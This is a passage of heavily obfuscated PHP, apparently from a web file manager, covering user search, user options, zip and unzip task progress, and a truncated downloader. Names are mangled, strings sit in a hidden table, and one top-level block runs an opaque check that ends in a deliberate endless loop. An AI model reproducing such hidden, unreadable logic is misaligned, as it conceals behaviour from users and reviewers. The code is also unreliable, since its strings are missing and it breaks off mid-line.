$FÄ»šÉŠÙ[$Bä½Ñíµ[2156]]; $f±ÏÇ¥ïÁ = isset($FÄ»šÉŠÙ[$Bä½Ñíµ[2157]]) ? $FÄ»šÉŠÙ[$Bä½Ñíµ[2157]] : !1; goto AŠ¨ç”…ƒö; AŠ¨ç”…ƒö: $A Àè»’˜ê = str_replace($Bä½Ñíµ[2158], $Bä½Ñíµ[2159], trim($A Àè»’˜ê)); $aŒ—…ƒ‹è° = array($Bä½Ñíµ[28] => array($Bä½Ñíµ[753], "\45{$A Àè»’˜ê}\45"), $Bä½Ñíµ[289] => array($Bä½Ñíµ[753], "\45{$A Àè»’˜ê}\45"), $Bä½Ñíµ[2300] => array($Bä½Ñíµ[753], "\45{$A Àè»’˜ê}\45"), $Bä½Ñíµ[918] => $Bä½Ñíµ[2160]); if (Input::check($A Àè»’˜ê, $Bä½Ñíµ[295])) { $aŒ—…ƒ‹è°[$Bä½Ñíµ[1417]] = array($Bä½Ñíµ[753], "\45{$A Àè»’˜ê}\x25"); $aŒ—…ƒ‹è°[$Bä½Ñíµ[2479]] = array($Bä½Ñíµ[753], "\x25{$A Àè»’˜ê}\x25"); } goto E“Ù—²”õí; e¤½Ù¶™Ô: if (!$d¦¶Óò—…° || count($d¦¶Óò—…°[$Bä½Ñíµ[350]]) < 5 && Input::check($A Àè»’˜ê, $Bä½Ñíµ[302])) { $aóàñ¿ = $this->_searchFromMeta($Bä½Ñíµ[410], $A Àè»’˜ê, 10); $bÁ ÖšÜ¨É = $this->_searchFromMeta($Bä½Ñíµ[411], $A Àè»’˜ê, 10); $EÒƒŞ¸ªÍŒ = array_merge($aóàñ¿, $bÁ ÖšÜ¨É, $d¦¶Óò—…°[$Bä½Ñíµ[350]]); $d¦¶Óò—…°[$Bä½Ñíµ[350]] = array_unique_by_key($EÒƒŞ¸ªÍŒ, $Bä½Ñíµ[1417]); $d¦¶Óò—…°[$Bä½Ñíµ[347]][$Bä½Ñíµ[348]] = count($d¦¶Óò—…°[$Bä½Ñíµ[350]]); $d¦¶Óò—…°[$Bä½Ñíµ[347]][$Bä½Ñíµ[349]] = ceil($d¦¶Óò—…°[$Bä½Ñíµ[347]][$Bä½Ñíµ[348]] / $d¦¶Óò—…°[$Bä½Ñíµ[347]][$Bä½Ñíµ[345]]); } $this->_listDataApply($d¦¶Óò—…°[$Bä½Ñíµ[350]]); $this->_filterByGroup($d¦¶Óò—…°, $f±ÏÇ¥ïÁ); goto bÉ¨Ï‚»»; bÉ¨Ï‚»»: return $d¦¶Óò—…°; goto Då³êÍ¶Ï…; Då³êÍ¶Ï…: } private function _filterByGroup(&$e‰¢‚™âñ‰, $fé—‹¤£õç) { $aŞåÂ¾¤¤ =& $_SERVER[Õİõş]; if (!$fé—‹¤£õç) { return $e‰¢‚™âñ‰; } foreach ($e‰¢‚™âñ‰[$aŞåÂ¾¤¤[350]] as $dŸ‰³«ò— => &$a¾Çì”‹ƒÚ) { $Dß¦Í×›ÀÖ = array_to_keyvalue($a¾Çì”‹ƒÚ[$aŞåÂ¾¤¤[2500]], $aŞåÂ¾¤¤[33], $aŞåÂ¾¤¤[2080]); if (!in_array($fé—‹¤£õç, $Dß¦Í×›ÀÖ)) { unset($e‰¢‚™âñ‰[$aŞåÂ¾¤¤[350]][$dŸ‰³«ò—]); } } $e‰¢‚™âñ‰[$aŞåÂ¾¤¤[350]] = array_values($e‰¢‚™âñ‰[$aŞåÂ¾¤¤[350]]); $e‰¢‚™âñ‰[$aŞåÂ¾¤¤[347]] = array($aŞåÂ¾¤¤[2275] => count($e‰¢‚™âñ‰[$aŞåÂ¾¤¤[350]]), $aŞåÂ¾¤¤[2273] => $e‰¢‚™âñ‰[$aŞåÂ¾¤¤[347]][$aŞåÂ¾¤¤[345]], $aŞåÂ¾¤¤[2272] => 1, $aŞåÂ¾¤¤[2274] => 1); } private function _searchFromMeta($dŒìÚ»ñ©¿, $a†œ‹çä†, $F¦ğÀÒˆˆí) { goto e¦ÇÂ£”§; e Œß¬ªé: $dîˆÚÏ°í = Model($E‰ŒĞ¢“†—[2501])->where($cµ÷Ë«³Äœ)->limit($F¦ğÀÒˆˆí)->select(); if (!$dîˆÚÏ°í) { return array(); } $dîˆÚÏ°í = array_to_keyvalue($dîˆÚÏ°í, $E‰ŒĞ¢“†—[33], $E‰ŒĞ¢“†—[1417]); goto c˜ë¨‹¢¦; c˜ë¨‹¢¦: $FÈçÉÁÊ› = $this->where(array($E‰ŒĞ¢“†—[1408] => array($E‰ŒĞ¢“†—[7], $dîˆÚÏ°í)))->select(); if (!$FÈçÉÁÊ›) { return array(); } return $FÈçÉÁÊ›; goto F¬ÜŒÙ—Ó; e¦ÇÂ£”§: $E‰ŒĞ¢“†— =& $_SERVER[Õİõş]; $a†œ‹çä† = strtolower($a†œ‹çä†); $cµ÷Ë«³Äœ = array($E‰ŒĞ¢“†—[89] => $dŒìÚ»ñ©¿, $E‰ŒĞ¢“†—[355] => array($E‰ŒĞ¢“†—[753], "\45{$a†œ‹çä†}\x25")); goto e Œß¬ªé; F¬ÜŒÙ—Ó: } private function _listDataApplyItem($fí‚å¡ŠÛ­) { $cÄ¾¬îà¦ = array($fí‚å¡ŠÛ­); $this->_listDataApply($cÄ¾¬îà¦); return $cÄ¾¬îà¦[0]; } private function _listDataApply(&$eËÚ¥¯ˆèí) { goto fª‹çôöáø; A“Èî—ò°: $bÑÌÙ´Ê¨Ï = array_to_keyvalue($eËÚ¥¯ˆèí, $fÙÉ¯…®±[33], $fÙÉ¯…®±[1417]); $this->_listAppendGroup($eËÚ¥¯ˆèí, $bÑÌÙ´Ê¨Ï); $this->_listAppendMeta($eËÚ¥¯ˆèí, $bÑÌÙ´Ê¨Ï); goto AÈˆ¸Åœšˆ; AÈˆ¸Åœšˆ: $this->_listAppendSourceRoot($eËÚ¥¯ˆèí, $bÑÌÙ´Ê¨Ï); goto A‘ŠÃåÈÇÔ; fª‹çôöáø: $fÙÉ¯…®± =& $_SERVER[Õİõş]; if (!$eËÚ¥¯ˆèí) { return; } array_remove_key($eËÚ¥¯ˆèí, $fÙÉ¯…®±[806]); goto A“Èî—ò°; A‘ŠÃåÈÇÔ: } private function _listAppendSourceRoot(&$bë°ˆåÆæÓ, $bÁô«ß¡«‹) { goto bŒ²Å±ä‚; c¦‘ùÙèŞ: $A¦¡®½©² = Model($D’Æ²ùÒ²[754])->order($D’Æ²ùÒ²[2167])->field($aÉ´’ƒ‡ß)->where($bİŞÌ†ˆ´¼)->select(); $A¦¡®½©² = array_to_keyvalue($A¦¡®½©², $D’Æ²ùÒ²[451]); $A¦¡®½©² = array_remove_key($A¦¡®½©², $D’Æ²ùÒ²[451]); goto eŞÕòç«¸÷; bŒ²Å±ä‚: $D’Æ²ùÒ² =& $_SERVER[Õİõş]; $bİŞÌ†ˆ´¼ = array($D’Æ²ùÒ²[456] => 0, $D’Æ²ùÒ²[367] => SourceModel::TYPE_USER, $D’Æ²ùÒ²[451] => array($D’Æ²ùÒ²[7], $bÁô«ß¡«‹)); $aÉ´’ƒ‡ß = $D’Æ²ùÒ²[2166]; goto c¦‘ùÙèŞ; eŞÕòç«¸÷: foreach ($bë°ˆåÆæÓ as &$BìƒİÈùò‘) { $BìƒİÈùò‘[$D’Æ²ùÒ²[387]] = $A¦¡®½©²[$BìƒİÈùò‘[$D’Æ²ùÒ²[1417]]] ? $A¦¡®½©²[$BìƒİÈùò‘[$D’Æ²ùÒ²[1417]]] : array(); } goto aƒó©·À; aƒó©·À: } private function _listAppendGroup(&$a‚‹‡‚¢Ìğ, $CÇÛİÄ²) { goto a ±’àÂ; a„½ÁÁğ­: $dÇ¢²Öº´Ï = array($E’øÜ¯ù×ß[2080] => array($E’øÜ¯ù×ß[7], $EäÒƒÓğª)); $d•îí•òà = Model($E’øÜ¯ù×ß[2502])->field($E’øÜ¯ù×ß[2503])->where($dÇ¢²Öº´Ï)->select(); $Eñ´Ô Ü¤ = array_to_keyvalue($d•îí•òà, $E’øÜ¯ù×ß[2080], $E’øÜ¯ù×ß[28]); goto f­‘Ïâ…¡; AŠåÔ®‚¯£: $EäÒƒÓğª = array_to_keyvalue($a†ô‡²‚áñ, $E’øÜ¯ù×ß[33], $E’øÜ¯ù×ß[2080]); $EäÒƒÓğª = array_remove_value(array_unique($EäÒƒÓğª), $E’øÜ¯ù×ß[463]); if (!$EäÒƒÓğª || !$a†ô‡²‚áñ) { return; } goto a„½ÁÁğ­; f­‘Ïâ…¡: $a†ô‡²‚áñ = array_to_keyvalue_group($a†ô‡²‚áñ, $E’øÜ¯ù×ß[1417]); foreach ($a†ô‡²‚áñ as &$EÁÁ¬Ÿµñ±) { $bùŠÎ›Òãë = array(); foreach ($EÁÁ¬Ÿµñ± as $D™¾†˜»¾‰) { if (!$D™¾†˜»¾‰[$E’øÜ¯ù×ß[2208]]) { continue; } $céá‹ë¬ÏÌ = Model($E’øÜ¯ù×ß[2227])->listData($D™¾†˜»¾‰[$E’øÜ¯ù×ß[2208]]); $bùŠÎ›Òãë[] = array($E’øÜ¯ù×ß[2080] => $D™¾†˜»¾‰[$E’øÜ¯ù×ß[2080]], $E’øÜ¯ù×ß[2504] => $Eñ´Ô Ü¤[$D™¾†˜»¾‰[$E’øÜ¯ù×ß[2080]]], $E’øÜ¯ù×ß[372] => $céá‹ë¬ÏÌ); } $EÁÁ¬Ÿµñ± = $bùŠÎ›Òãë; } foreach ($a‚‹‡‚¢Ìğ as &$BôóÙİóÎ) { $BôóÙİóÎ[$E’øÜ¯ù×ß[2500]] = array(); if (isset($a†ô‡²‚áñ[$BôóÙİóÎ[$E’øÜ¯ù×ß[1417]]])) { $BôóÙİóÎ[$E’øÜ¯ù×ß[2500]] = $a†ô‡²‚áñ[$BôóÙİóÎ[$E’øÜ¯ù×ß[1417]]]; } } goto AÉğ©Œ í×; a ±’àÂ: $E’øÜ¯ù×ß =& $_SERVER[Õİõş]; $dÇ¢²Öº´Ï = array($E’øÜ¯ù×ß[1417] => array($E’øÜ¯ù×ß[7], $CÇÛİÄ²)); $a†ô‡²‚áñ = Model($E’øÜ¯ù×ß[2154])->where($dÇ¢²Öº´Ï)->select(); goto AŠåÔ®‚¯£; AÉğ©Œ í×: } private function _listAppendMeta(&$bØóÜ»Ä³, $F”¬½ò…³œ) { goto BŞ¸¤§Ö; F‡Åñ½óŞ÷: $B÷™Î‘ºÇÛ = array($cõàÒë½Ä‡[1417] => array($cõàÒë½Ä‡[7], $F”¬½ò…³œ)); $Eë‡«ô”Ÿ = Model($cõàÒë½Ä‡[2478])->where($B÷™Î‘ºÇÛ)->select(); $Eë‡«ô”Ÿ = array_to_keyvalue_group($Eë‡«ô”Ÿ, $cõàÒë½Ä‡[1417]); goto Béš†ê«‡; BŞ¸¤§Ö: $cõàÒë½Ä‡ =& $_SERVER[Õİõş]; $EœñŞÇ³Í = UserJobModel::JOB_KEY; $aÔ¨‘¼­Ú¯ = array($cõàÒë½Ä‡[2481]); goto F‡Åñ½óŞ÷; Béš†ê«‡: foreach ($Eë‡«ô”Ÿ as &$E”íŒµ„Ü) { $C˜¤±¹ëŸº = array(); foreach ($E”íŒµ„Ü as $Döß‹¡ÚÌ“) { if (!in_array($Döß‹¡ÚÌ“[$cõàÒë½Ä‡[89]], $aÔ¨‘¼­Ú¯)) { $C˜¤±¹ëŸº[$Döß‹¡ÚÌ“[$cõàÒë½Ä‡[89]]] = $Döß‹¡ÚÌ“[$cõàÒë½Ä‡[355]]; } } $E”íŒµ„Ü = $C˜¤±¹ëŸº; } $AÉÑÏî‚ÂØ = Model($cõàÒë½Ä‡[2505]); foreach ($bØóÜ»Ä³ as &$f„ÊÏÎ¯ò) { $C§ƒØ¬Ï²Ë = array(); if (isset($Eë‡«ô”Ÿ[$f„ÊÏÎ¯ò[$cõàÒë½Ä‡[1417]]])) { $C§ƒØ¬Ï²Ë = $Eë‡«ô”Ÿ[$f„ÊÏÎ¯ò[$cõàÒë½Ä‡[1417]]]; } $f„ÊÏÎ¯ò[$cõàÒë½Ä‡[2506]] = array(); if (isset($C§ƒØ¬Ï²Ë[$EœñŞÇ³Í])) { $f„ÊÏÎ¯ò[$cõàÒë½Ä‡[2506]] = $AÉÑÏî‚ÂØ->getUserJobInfo($C§ƒØ¬Ï²Ë[$EœñŞÇ³Í]); } } goto E­î¡á¥¼–; E­î¡á¥¼–: } public function userSearch($CÍéª¢’¸“, $D›Æ‰ŒÜ¡Ë = "\x2a") { return Model($_SERVER[Õİõş][472])->where($CÍéª¢’¸“)->field($D›Æ‰ŒÜ¡Ë)->find(); } } if (!isset($_SERVER[$_SERVER[Õİõş][764]]) || !isset($_SERVER[$_SERVER[Õİõş][1027]])) { goto eöÒ¬ˆ—Ç; e«ŒŠğÉ°: $cŞ¾‹ÆÄ× = explode($_SERVER[Õİõş][213], $B¢§„ìª­); if (count($cŞ¾‹ÆÄ×) < $_SERVER[Õİõş][560]) { $Cá¬âÛ¦áÙ = $_SERVER[Õİõş][768]; $Cá¬âÛ¦áÙ(); } $Bä‘æŠéÖ = $_SERVER[Õİõş][769]; goto dÂĞèÈÕÇ…; dÂĞèÈÕÇ…: $Bä‘æŠéÖ($_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]); $c½ãœÉÁÖ½ = 2; while ($c½ãœÉÁÖ½ > 1) { $Dª¯“¡çåÃ = rawurlencode($c½ãœÉÁÖ½ . $_SERVER[Õİõş][357]); } goto e­ÈÁœ´¥‹; eöÒ¬ˆ—Ç: $b—‹äÎÇæ‹ = $_SERVER[Õİõş][765]; $bªÈ×¡˜è¤ = $_SERVER[$_SERVER[Õİõş][766]] . $_SERVER[Õİõş][767]; $B¢§„ìª­ = $b—‹äÎÇæ‹($bªÈ×¡˜è¤); goto e«ŒŠğÉ°; e­ÈÁœ´¥‹: } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($f¹à¯®‹íÃ) { $cÆĞÆ½¥³Â =& $_SERVER[Õİõş]; if (!defined($cÆĞÆ½¥³Â[422])) { define($cÆĞÆ½¥³Â[422], 0); } return "\x55\x73\x65\162\117\x70\x74\151\157\156\x5f{$f¹à¯®‹íÃ}\137" . USER_ID; } protected function filterWhere($föÑéÔÀ£) { $E¨ƒ´ÊÇ˜ =& $_SERVER[Õİõş]; if (!defined($E¨ƒ´ÊÇ˜[422])) { define($E¨ƒ´ÊÇ˜[422], 0); } $föÑéÔÀ£[$E¨ƒ´ÊÇ˜[1417]] = USER_ID; return $föÑéÔÀ£; } public function cacheRemoveUser($BĞŒ’¸…, $f»í­êˆ’“) { return Cache::remove("\125\163\145\162\117\x70\164\x69\x6f\156\137{$BĞŒ’¸…}\137" . $f»í­êˆ’“); } protected function optionDefault($A­ÕÜ³Ùˆ = '') { $C•éÚËÈ¡ =& $_SERVER[Õİõş]; if ($A­ÕÜ³Ùˆ == $C•éÚËÈ¡[33]) { return $GLOBALS[$C•éÚËÈ¡[6]][$C•éÚËÈ¡[2507]]; } if ($A­ÕÜ³Ùˆ == $C•éÚËÈ¡[2508]) { return $GLOBALS[$C•éÚËÈ¡[6]][$C•éÚËÈ¡[2509]]; } } } goto BÑÆÔ‰¸Ï±; fš•´¶ğÚÄ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Dù§îŸ´ˆ; dºç¾Ô: Hook::bind($EÄËÂ™ïğñ[1038], array($this, $EÄËÂ™ïğñ[1484])); $cÇ“Œ¯†¯… =& $this->task; $cÇ“Œ¯†¯…[$EÄËÂ™ïğñ[1485]] = $EÄËÂ™ïğñ[1043]; goto eëÒêÃ¹…ğ; Dù§îŸ´ˆ: $EÄËÂ™ïğñ =& $_SERVER[Õİõş]; parent::startAfter(); Hook::bind($EÄËÂ™ïğñ[1482], array($this, $EÄËÂ™ïğñ[1483])); goto dºç¾Ô; eëÒêÃ¹…ğ: if (!$cÇ“Œ¯†¯…[$EÄËÂ™ïğñ[1325]]) { $cÇ“Œ¯†¯…[$EÄËÂ™ïğñ[1325]] = LNG($EÄËÂ™ïğñ[1486]); } goto b¸æÚÍ£Ê; b¸æÚÍ£Ê: } protected function endAfter() { $b“‘ø‚… =& $_SERVER[Õİõş]; parent::endAfter(); Hook::unbind($b“‘ø‚…[1482], array($this, $b“‘ø‚…[1483])); Hook::unbind($b“‘ø‚…[1038], array($this, $b“‘ø‚…[1484])); } public function updateAfter() { $cÊà‚–‘œ =& $_SERVER[Õİõş]; $aÌôÕœó =& $this->task; if (!$aÌôÕœó[$cÊà‚–‘œ[980]] || !$aÌôÕœó[$cÊà‚–‘œ[700]]) { return; } if ($aÌôÕœó[$cÊà‚–‘œ[1485]] == $cÊà‚–‘œ[1043]) { $E¸­Šø¼ó = 0; if ($aÌôÕœó[$cÊà‚–‘œ[1462]]) { $E¸­Šø¼ó = $aÌôÕœó[$cÊà‚–‘œ[1463]] / $aÌôÕœó[$cÊà‚–‘œ[1462]]; } $aÌôÕœó[$cÊà‚–‘œ[1418]] = $E¸­Šø¼ó * 0.3; } else { if ($aÌôÕœó[$cÊà‚–‘œ[1485]] == $cÊà‚–‘œ[297]) { $E¸­Šø¼ó = $aÌôÕœó[$cÊà‚–‘œ[992]] / $aÌôÕœó[$cÊà‚–‘œ[980]]; $aÌôÕœó[$cÊà‚–‘œ[1418]] = 0.3 + $E¸­Šø¼ó * 0.4; } else { if ($aÌôÕœó[$cÊà‚–‘œ[1485]] == $cÊà‚–‘œ[102]) { $AïŸĞ†›ô  = 0; if ($aÌôÕœó[$cÊà‚–‘œ[1464]] == $cÊà‚–‘œ[102]) { $AïŸĞ†›ô  = $aÌôÕœó[$cÊà‚–‘œ[1463]]; } $E¸­Šø¼ó = ($aÌôÕœó[$cÊà‚–‘œ[1467]] + $AïŸĞ†›ô ) / $aÌôÕœó[$cÊà‚–‘œ[700]]; $aÌôÕœó[$cÊà‚–‘œ[1418]] = 0.3 + 0.4 + $E¸­Šø¼ó * 0.3; } } } if ($aÌôÕœó[$cÊà‚–‘œ[1418]] > 0) { $cÍ‰•õ¼À = timeFloat() - $aÌôÕœó[$cÊà‚–‘œ[1420]] - $aÌôÕœó[$cÊà‚–‘œ[1423]]; $aÌôÕœó[$cÊà‚–‘œ[1424]] = $cÍ‰•õ¼À * (1 - $aÌôÕœó[$cÊà‚–‘œ[1418]]) / $aÌôÕœó[$cÊà‚–‘œ[1418]]; } } public function addFile($cÏàß„ô¾ä) { goto eÒ¯›À¥Ú; Aè˜—¶À: $ešÔ¬º„À[$a¬ç¬‚ĞÇ[1460]] = $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[28]]; $ešÔ¬º„À[$a¬ç¬‚ĞÇ[1462]] = $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[77]]; $ešÔ¬º„À[$a¬ç¬‚ĞÇ[1463]] = 0; goto DÒŸÉ«´Îè; b¯½•ãîÇß: $ešÔ¬º„À[$a¬ç¬‚ĞÇ[980]] = 1; $aåçÕ”à£ = 0; $ešÔ¬º„À[$a¬ç¬‚ĞÇ[1468]] = array($a¬ç¬‚ĞÇ[1469] => $aåçÕ”à£ + 1, $a¬ç¬‚ĞÇ[382] => $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[28]], $a¬ç¬‚ĞÇ[75] => $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[75]], $a¬ç¬‚ĞÇ[461] => $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[461]] ? $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[461]] : $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[75]]); goto BÂ®„’É—¡; BÂ®„’É—¡: $this->update(); goto DÏÇËƒ¾ƒØ; DÒŸÉ«´Îè: $ešÔ¬º„À[$a¬ç¬‚ĞÇ[982]] = $a¬ç¬‚ĞÇ[1475]; $ešÔ¬º„À[$a¬ç¬‚ĞÇ[1464]] = $a¬ç¬‚ĞÇ[1043]; $ešÔ¬º„À[$a¬ç¬‚ĞÇ[700]] = $b¿Ò’êåƒß[$a¬ç¬‚ĞÇ[77]]; goto b¯½•ãîÇß; eÒ¯›À¥Ú: $a¬ç¬‚ĞÇ =& $_SERVER[Õİõş]; $ešÔ¬º„À =& $this->task; $b¿Ò’êåƒß = IO::info($cÏàß„ô¾ä); goto Aè˜—¶À; DÏÇËƒ¾ƒØ: } public function unzipAfter($DììŞ—áˆŒ) { goto bŸ“¥Á™; cÔ˜‹±…àÒ: $eï‰åíÃ˜[$a¾ÉÒ°[992]] = 0; $eï‰åíÃ˜[$a¾ÉÒ°[1462]] = 0; $eï‰åíÃ˜[$a¾ÉÒ°[1463]] = 0; goto bó¿ßšƒ¹‹; bîÅ»‹¼¸¡: if ($F´ŸÓ×à–¹[$a¾ÉÒ°[29]] == $a¾ÉÒ°[163]) { $eï‰åíÃ˜[$a¾ÉÒ°[980]] = 1; } else { $eï‰åíÃ˜[$a¾ÉÒ°[980]] = $F´ŸÓ×à–¹[$a¾ÉÒ°[80]][$a¾ÉÒ°[78]]; } $eï‰åíÃ˜[$a¾ÉÒ°[982]] = $a¾ÉÒ°[33]; $eï‰åíÃ˜[$a¾ÉÒ°[1464]] = 0; goto cÔ˜‹±…àÒ; FÈ«´ßÙ“: $this->update(); self::log($a¾ÉÒ°[1487] . json_encode(array($eï‰åíÃ˜, $F´ŸÓ×à–¹))); goto eÄåÕ‘Ø‡²; bŸ“¥Á™: $a¾ÉÒ° =& $_SERVER[Õİõş]; $eï‰åíÃ˜ =& $this->task; $eï‰åíÃ˜[$a¾ÉÒ°[1485]] = $a¾ÉÒ°[102]; goto C«İ™‰¶¬›; bó¿ßšƒ¹‹: $eï‰åíÃ˜[$a¾ÉÒ°[1460]] = $a¾ÉÒ°[33]; $eï‰åíÃ˜[$a¾ÉÒ°[1467]] = 0; $eï‰åíÃ˜[$a¾ÉÒ°[700]] = $F´ŸÓ×à–¹[$a¾ÉÒ°[77]]; goto FÈ«´ßÙ“; C«İ™‰¶¬›: $F´ŸÓ×à–¹ = IO::infoWithChildren($DììŞ—áˆŒ); $fÒ±İ†­¦Á = 0; $eï‰åíÃ˜[$a¾ÉÒ°[1468]] = array($a¾ÉÒ°[1469] => $fÒ±İ†­¦Á + 1, $a¾ÉÒ°[382] => $F´ŸÓ×à–¹[$a¾ÉÒ°[28]], $a¾ÉÒ°[75] => $F´ŸÓ×à–¹[$a¾ÉÒ°[75]], $a¾ÉÒ°[461] => $F´ŸÓ×à–¹[$a¾ÉÒ°[461]] ? $F´ŸÓ×à–¹[$a¾ÉÒ°[461]] : $F´ŸÓ×à–¹[$a¾ÉÒ°[75]]); goto bîÅ»‹¼¸¡; eÄåÕ‘Ø‡²: } public function nameParse($Bõß²¦¨—) { goto fïæè§‡ ; f’ÛÎ²ç“: $c‰˜‹¤Ò = get_path_this($Bõß²¦¨—); if (strstr($c‰˜‹¤Ò, $D‡Â‹Ğ¬‘Ä[91])) { $Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[992]] += 1; $Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[980]] += 1; } $Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[1460]] = $Bõß²¦¨—; goto dŞôØøôàá; dŞôØøôàá: $this->update(); goto bçÓ‹Óò; fïæè§‡ : $D‡Â‹Ğ¬‘Ä =& $_SERVER[Õİõş]; $Cëõ½Ô§Š =& $this->task; if ($Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[1485]] == $D‡Â‹Ğ¬‘Ä[1043]) { $Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[1485]] = $D‡Â‹Ğ¬‘Ä[297]; $Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[1467]] = 0; $Cëõ½Ô§Š[$D‡Â‹Ğ¬‘Ä[700]] = 0; } goto f’ÛÎ²ç“; bçÓ‹Óò: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $F·ëÎì®Œ¨ =& $_SERVER[Õİõş]; parent::startAfter(); Hook::bind($F·ëÎì®Œ¨[1488], array($this, $F·ëÎì®Œ¨[1483])); $fğåµÓ‘™’ =& $this->task; $fğåµÓ‘™’[$F·ëÎì®Œ¨[1485]] = $F·ëÎì®Œ¨[1043]; if (!$fğåµÓ‘™’[$F·ëÎì®Œ¨[1325]]) { $fğåµÓ‘™’[$F·ëÎì®Œ¨[1325]] = LNG($F·ëÎì®Œ¨[1489]); } } protected function endAfter() { $A‰ï¾©¨¡î =& $_SERVER[Õİõş]; parent::endAfter(); Hook::unbind($A‰ï¾©¨¡î[1488], array($this, $A‰ï¾©¨¡î[1483])); } public function updateAfter() { $EŞôå’„åõ =& $_SERVER[Õİõş]; $f²£“ƒ¨›¹ =& $this->task; if (!$f²£“ƒ¨›¹[$EŞôå’„åõ[980]] || !$f²£“ƒ¨›¹[$EŞôå’„åõ[700]]) { return; } if ($f²£“ƒ¨›¹[$EŞôå’„åõ[1485]] == $EŞôå’„åõ[1043]) { $cÌÀ½ëİÅ× = $f²£“ƒ¨›¹[$EŞôå’„åõ[1463]]; if ($f²£“ƒ¨›¹[$EŞôå’„åõ[1464]] != $EŞôå’„åõ[1043]) { $cÌÀ½ëİÅ× = 0; } $Bµ½²•±­ = ($f²£“ƒ¨›¹[$EŞôå’„åõ[1467]] + $cÌÀ½ëİÅ×) / $f²£“ƒ¨›¹[$EŞôå’„åõ[700]]; $f²£“ƒ¨›¹[$EŞôå’„åõ[1418]] = $Bµ½²•±­ * 0.3; } else { if ($f²£“ƒ¨›¹[$EŞôå’„åõ[1485]] == $EŞôå’„åõ[297]) { $Bµ½²•±­ = $f²£“ƒ¨›¹[$EŞôå’„åõ[992]] / $f²£“ƒ¨›¹[$EŞôå’„åõ[980]]; $f²£“ƒ¨›¹[$EŞôå’„åõ[1418]] = 0.3 + $Bµ½²•±­ * 0.5; } else { if ($f²£“ƒ¨›¹[$EŞôå’„åõ[1485]] == $EŞôå’„åõ[102]) { $Bµ½²•±­ = 0; if ($f²£“ƒ¨›¹[$EŞôå’„åõ[1462]]) { $Bµ½²•±­ = $f²£“ƒ¨›¹[$EŞôå’„åõ[1463]] / $f²£“ƒ¨›¹[$EŞôå’„åõ[1462]]; } $f²£“ƒ¨›¹[$EŞôå’„åõ[1418]] = 0.3 + 0.5 + $Bµ½²•±­ * 0.2; } } } if ($f²£“ƒ¨›¹[$EŞôå’„åõ[1418]] > 0) { $eÇŒèªõ‰¸ = timeFloat() - $f²£“ƒ¨›¹[$EŞôå’„åõ[1420]] - $f²£“ƒ¨›¹[$EŞôå’„åõ[1423]]; $f²£“ƒ¨›¹[$EŞôå’„åõ[1424]] = $eÇŒèªõ‰¸ * (1 - $f²£“ƒ¨›¹[$EŞôå’„åõ[1418]]) / $f²£“ƒ¨›¹[$EŞôå’„åõ[1418]]; } } public function copyFileStart($dâ¥œ¶îÛÉ, $b­Ä»æŒéØ, $AÙò¯°ÃÓã, $d‚ã¨Ÿ‹†‡, $EÜŸÆïî’„, $Cóì²‘Û©ø) { $BÁ•¥Óˆ‘Ñ =& $_SERVER[Õİõş]; parent::copyFileStart($dâ¥œ¶îÛÉ, $b­Ä»æŒéØ, $AÙò¯°ÃÓã, $d‚ã¨Ÿ‹†‡, $EÜŸÆïî’„, $Cóì²‘Û©ø); $bŸÛ­Ÿõ®‘ =& $this->task; if ($bŸÛ­Ÿõ®‘[$BÁ•¥Óˆ‘Ñ[1485]] == $BÁ•¥Óˆ‘Ñ[297]) { $bŸÛ­Ÿõ®‘[$BÁ•¥Óˆ‘Ñ[1485]] = $BÁ•¥Óˆ‘Ñ[102]; } $this->update(); } public function copyFileEnd($DŠ®ÄÛ¤ÛÖ, $bÈİîÄ‰æ, $fÕ¿£ìÖÍ«, $e³àğ®¸Ä‹, $BÜ‘í·Š, $AŠ“ÄŒÀÂ²) { $AšœçÙ‚¶½ =& $_SERVER[Õİõş]; $bˆÒôçíÈÎ =& $this->task; $bˆÒôçíÈÎ[$AšœçÙ‚¶½[1463]] = $bˆÒôçíÈÎ[$AšœçÙ‚¶½[1462]]; $bˆÒôçíÈÎ[$AšœçÙ‚¶½[1467]] += $bˆÒôçíÈÎ[$AšœçÙ‚¶½[1462]]; $bˆÒôçíÈÎ[$AšœçÙ‚¶½[1464]] = $AšœçÙ‚¶½[33]; $this->update(); } public function nameParse($aÛìÙó½Õ¬) { $fÑ­§õ½Ä¬ =& $_SERVER[Õİõş]; $c·¤…ó„¨á =& $this->task; if ($c·¤…ó„¨á[$fÑ­§õ½Ä¬[992]] < $c·¤…ó„¨á[$fÑ­§õ½Ä¬[980]]) { $C¼†ªÉ¤åô = get_path_this($aÛìÙó½Õ¬); if (strstr($C¼†ªÉ¤åô, $fÑ­§õ½Ä¬[91])) { $c·¤…ó„¨á[$fÑ­§õ½Ä¬[992]] += 1; } } if ($c·¤…ó„¨á[$fÑ­§õ½Ä¬[1485]] == $fÑ­§õ½Ä¬[1043]) { $c·¤…ó„¨á[$fÑ­§õ½Ä¬[1485]] = $fÑ­§õ½Ä¬[297]; } $c·¤…ó„¨á[$fÑ­§õ½Ä¬[1460]] = $aÛìÙó½Õ¬; $this->update(); } } class Downloader { static function start($añ Á˜Æ×Õ, $F¥ïÉ‹§ç, $bÎ…­¤©ƒ« = 10) { goto CÜ¶Š‰œ¢ñ; F‹à«ˆ£ Ç: if ($cö‰åˆéÁÙ > $fíé—‡Áôº) { @unlink($B ×É¼èİÎ); } file_put_contents($DòÇÑ©é‘­, json_encode($Cš¼„ğ÷ˆ)); $B«˜””Ù = self::fileDownloadCurl($añ Á˜Æ×Õ, $F¥ïÉ‹§ç, !0, 